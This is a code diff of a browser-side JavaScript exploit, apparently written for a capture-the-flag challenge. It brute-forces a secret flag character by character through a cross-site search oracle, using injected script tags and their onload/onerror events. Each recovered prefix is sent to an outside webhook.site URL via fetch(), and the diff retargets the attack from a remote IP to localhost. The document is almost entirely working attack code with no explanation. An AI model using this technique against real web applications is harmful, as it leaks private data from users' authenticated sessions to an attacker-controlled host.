@@ -9,13 +9,13 @@
                 let cnt = 0;
                 for (let i = 32; i < 127; i++) {
                     let curChar = String.fromCharCode(i);
-                    if ('_% '.includes(curChar)) {
+                    if ('_%'.includes(curChar)) {
                         continue;
                     }
                     
                     let elem = document.createElement('script');
                     let curFlag = flag + curChar;
-                    elem.src = `http://167.172.61.89:31622/api/entries/search?q=${encodeURIComponent(curFlag)}`;
+                    elem.src = `http://127.0.0.1:1337/api/entries/search?q=${encodeURIComponent(curFlag)}`;
                     elem.onload = () => {
                         fetch(`https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/${curFlag.replace('\\', '')}`);
                         brute_force_flag(curFlag);
@@ -23,7 +23,7 @@
                     elem.onerror = () => {
                         cnt++;
                         console.log(cnt);
-                        if (cnt >= 127 - 32 - 2 - 1 && flag[flag.length - 1] != '}') {
+                        if (cnt >= 127 - 32 - 2 && flag[flag.length - 1] != '}') {
                             brute_force_flag(flag + '_');
                         }
                     };
